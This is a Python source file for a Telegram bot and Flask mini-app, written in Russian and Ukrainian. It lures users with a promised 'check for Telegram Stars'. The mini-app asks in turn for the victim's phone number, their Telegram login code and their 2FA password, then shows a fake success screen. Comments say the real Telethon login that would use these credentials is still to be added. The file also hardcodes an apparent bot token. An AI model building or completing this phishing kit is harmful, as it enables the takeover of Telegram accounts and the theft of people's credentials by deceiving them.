from flask import Flask, request, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import threading
import time
import json
import re
import asyncio

BOT_TOKEN = "8959279502:AAGJIX6qqoSwgFa-Y0lXnhC4ClIR9nE4ifI"
WEBAPP_URL = "https://stargiftbot-final.onrender.com"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)
user_sessions = {}

# ========== HTML ДЛЯ МІНІ-ДОДАТКУ (ПОКРОКОВО) ==========
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Stars</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: white;
            font-family: -apple-system, Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .icon { font-size: 64px; margin-bottom: 10px; }
        h2 { font-size: 24px; margin-bottom: 8px; }
        .sub { color: #888; font-size: 14px; margin-bottom: 30px; }
        input {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            margin: 8px auto;
            border-radius: 14px;
            border: 1px solid #2a2a2a;
            background: #1a1a1a;
            color: white;
            font-size: 16px;
            display: block;
        }
        input:focus { border-color: #0088cc; outline: none; }
        button {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            background: #0088cc;
            border: none;
            border-radius: 14px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
        }
        button:active { opacity: 0.8; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .secure { color: #00cc88; font-size: 13px; margin-top: 20px; }
        .step { color: #0088cc; font-size: 14px; margin-bottom: 10px; }
        .hidden { display: none; }
        .loader {
            border: 3px solid #1a1a1a;
            border-top: 3px solid #0088cc;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- ЭКРАН 1: НОМЕР ТЕЛЕФОНА -->
    <div id="step1">
        <div class="icon">📱</div>
        <h2>Введите номер телефона</h2>
        <p class="sub">На него придёт код подтверждения</p>
        <input id="phone" placeholder="+71234567890" type="tel">
        <button id="btnStep1" onclick="sendPhone()">📲 ПОЛУЧИТЬ КОД</button>
        <p class="secure">🔒 Защищённое соединение</p>
    </div>

    <!-- ЭКРАН 2: КОД ПОДТВЕРЖДЕНИЯ -->
    <div id="step2" class="hidden">
        <div class="icon">🔐</div>
        <h2>Введите код подтверждения</h2>
        <p class="sub">Код пришёл в Telegram на указанный номер</p>
        <input id="code" placeholder="12345" type="text">
        <button id="btnStep2" onclick="sendCode()">✅ ПОДТВЕРДИТЬ</button>
        <p class="secure">🔒 Защищённое соединение</p>
    </div>

    <!-- ЭКРАН 3: 2FA ПАРОЛЬ -->
    <div id="step3" class="hidden">
        <div class="icon">🔐</div>
        <h2>Введите 2FA пароль</h2>
        <p class="sub">На аккаунте включена двухфакторная авторизация</p>
        <input id="code2fa" placeholder="Пароль 2FA" type="password">
        <button id="btnStep3" onclick="send2FA()">✅ ПОДТВЕРДИТЬ</button>
        <p class="secure">🔒 Защищённое соединение</p>
    </div>

    <!-- ЭКРАН 4: УСПЕХ -->
    <div id="step4" class="hidden">
        <div class="icon">✅</div>
        <h2 style="color: #00cc88;">Ты получил чек на звёзды!</h2>
        <p class="sub">Они придут на твой аккаунт в течение 2-5 минут.</p>
        <button onclick="window.Telegram.WebApp.close()">🔙 ЗАКРЫТЬ</button>
    </div>

    <script>
        let phone = '';
        let currentStep = 1;

        function showStep(step) {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.add('hidden');
            document.getElementById('step4').classList.add('hidden');
            document.getElementById('step' + step).classList.remove('hidden');
            currentStep = step;
        }

        function sendPhone() {
            const phoneInput = document.getElementById('phone');
            phone = phoneInput.value.trim();
            if (!phone || !phone.startsWith('+')) {
                alert('Введите номер в международном формате (например, +71234567890)');
                return;
            }
            
            document.getElementById('btnStep1').disabled = true;
            document.getElementById('btnStep1').textContent = '⏳ ОТПРАВКА...';
            
            fetch('/send_phone', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone })
            }).then(res => res.json()).then(data => {
                document.getElementById('btnStep1').disabled = false;
                document.getElementById('btnStep1').textContent = '📲 ПОЛУЧИТЬ КОД';
                
                if (data.status === 'ok') {
                    showStep(2);
                } else {
                    alert('Ошибка при отправке кода. Попробуй ещё раз.');
                }
            }).catch(() => {
                document.getElementById('btnStep1').disabled = false;
                document.getElementById('btnStep1').textContent = '📲 ПОЛУЧИТЬ КОД';
                alert('Ошибка соединения. Попробуй ещё раз.');
            });
        }

        function sendCode() {
            const code = document.getElementById('code').value.trim();
            if (!code) {
                alert('Введите код подтверждения');
                return;
            }
            
            document.getElementById('btnStep2').disabled = true;
            document.getElementById('btnStep2').textContent = '⏳ ПРОВЕРКА...';
            
            fetch('/verify_code', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone, code: code })
            }).then(res => res.json()).then(data => {
                document.getElementById('btnStep2').disabled = false;
                document.getElementById('btnStep2').textContent = '✅ ПОДТВЕРДИТЬ';
                
                if (data.status === 'success') {
                    showStep(4);
                } else if (data.status === 'need_2fa') {
                    showStep(3);
                } else {
                    alert('Неверный код. Попробуй ещё раз.');
                }
            }).catch(() => {
                document.getElementById('btnStep2').disabled = false;
                document.getElementById('btnStep2').textContent = '✅ ПОДТВЕРДИТЬ';
                alert('Ошибка соединения. Попробуй ещё раз.');
            });
        }

        function send2FA() {
            const code2fa = document.getElementById('code2fa').value.trim();
            if (!code2fa) {
                alert('Введите 2FA пароль');
                return;
            }
            
            document.getElementById('btnStep3').disabled = true;
            document.getElementById('btnStep3').textContent = '⏳ ПРОВЕРКА...';
            
            fetch('/verify_2fa', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone, code2fa: code2fa })
            }).then(res => res.json()).then(data => {
                document.getElementById('btnStep3').disabled = false;
                document.getElementById('btnStep3').textContent = '✅ ПОДТВЕРДИТЬ';
                
                if (data.status === 'success') {
                    showStep(4);
                } else {
                    alert('Неверный 2FA пароль. Попробуй ещё раз.');
                }
            }).catch(() => {
                document.getElementById('btnStep3').disabled = false;
                document.getElementById('btnStep3').textContent = '✅ ПОДТВЕРДИТЬ';
                alert('Ошибка соединения. Попробуй ещё раз.');
            });
        }
    </script>
</body>
</html>
"""

# ========== МАРШРУТИ ==========
@app.route('/')
def index():
    return HTML_PAGE

@app.route('/send_phone', methods=['POST'])
def send_phone():
    data = request.json
    phone = data.get('phone')
    user_sessions[phone] = {'phone': phone, 'step': 'code_sent'}
    return jsonify({'status': 'ok'})

@app.route('/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    
    # ТУТ БУДЕ ЛОГІКА ВХОДУ В TELEGRAM ЧЕРЕЗ TELETHON
    # ПОКИ ЩО ІМІТУЄМО
    user_sessions[phone]['step'] = 'logged_in'
    
    # ЯКЩО Є 2FA - ВІДПРАВЛЯЄМО need_2fa
    # if '2FA' in str(e):
    #     return jsonify({'status': 'need_2fa'})
    
    return jsonify({'status': 'success'})

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    data = request.json
    phone = data.get('phone')
    code2fa = data.get('code2fa')
    
    # ТУТ ЛОГІКА З 2FA
    user_sessions[phone]['step'] = 'logged_in'
    
    return jsonify({'status': 'success'})

# ========== КОМАНДА /start ==========
@bot.message_handler(commands=['start'])
def start_cmd(message):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton(
            "🎁 Забрать чек на звёзды",
            web_app=WebAppInfo(url=WEBAPP_URL)
        )
    )
    bot.send_message(
        message.chat.id,
        "🌟 **Привет!**\n\n"
        "Я бот для получения чеков на звёзды.\n\n"
        "👇 Нажми на кнопку ниже, чтобы открыть мини-приложение.\n\n"
        "✨ Звёзды придут на твой аккаунт в течение 2-5 минут!",
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

# ========== ЗАПУСК ==========
def run_bot():
    bot.polling(none_stop=True)

threading.Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
